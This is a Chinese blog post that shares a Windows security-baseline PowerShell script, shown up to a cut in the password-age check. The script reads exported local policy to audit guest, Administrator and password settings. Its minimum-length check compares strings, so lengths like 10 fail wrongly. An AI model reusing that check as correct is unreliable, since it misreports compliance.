    <content type="html"><![CDATA[<p>近期做基线检查，参考已有的基线脚本，二次修改使其符合windows基线Excel，并对代码中对细小错误进行了修改。</p><p>重新制作了windows安全基线Excel以及powershell脚本，并在gitub上传了文件</p><p>文件地址：<a href="https://github.com/zeringzxh/windows_baseline">https://github.com/zeringzxh/windows_baseline</a></p><a id="more"></a><p>Excel如下：</p><p><img src="/2021/03/31/Windows%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/1.jpg" alt></p><p>windows.ps1脚本:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"># author: zering</span></span><br><span class="line"><span class="comment"># add_time: 2021/03/15</span></span><br><span class="line"><span class="comment"># 安全配置策略基线检测脚本</span></span><br><span class="line"><span class="comment"># reference: https://github.com/Echox1/windows_baseline</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"><span class="variable">$PSDefaultParameterValues</span>[<span class="string">&#x27;Out-File:Encoding&#x27;</span>] = <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;project&quot;</span>=<span class="selector-tag">@</span>()&#125;</span><br><span class="line">secedit /export /cfg config.cfg /quiet</span><br><span class="line"></span><br><span class="line"><span class="comment">#账户检查</span></span><br><span class="line"><span class="variable">$config</span> = <span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_UserAccount</span><br><span class="line"><span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;当前账户为：<span class="variable">$</span>(<span class="variable">$config</span>)&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#guest停用策略</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;EnableGuestAccount &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;guest账户停用策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;guest账户停用策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#guest重命名策略</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;NewGuestName &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&#x27; `&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;Guest&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;guest账户重命名策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;guest账户重命名策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">#Administrator重命名策略</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;NewAdministratorName &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&#x27; `&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;Administrator&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;Administrator账户重命名策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;Administrator账户重命名策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#密码复杂性策略</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;PasswordComplexity &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码复杂性策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码复杂性策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">#密码长度最小值策略</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;MinimumPasswordLength &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-ge</span> <span class="string">&quot;8&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码最小值策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码最小值策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">#密码最长使用期限策略</span></span><br><span class="line">  </span><br><span class="line">   <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span 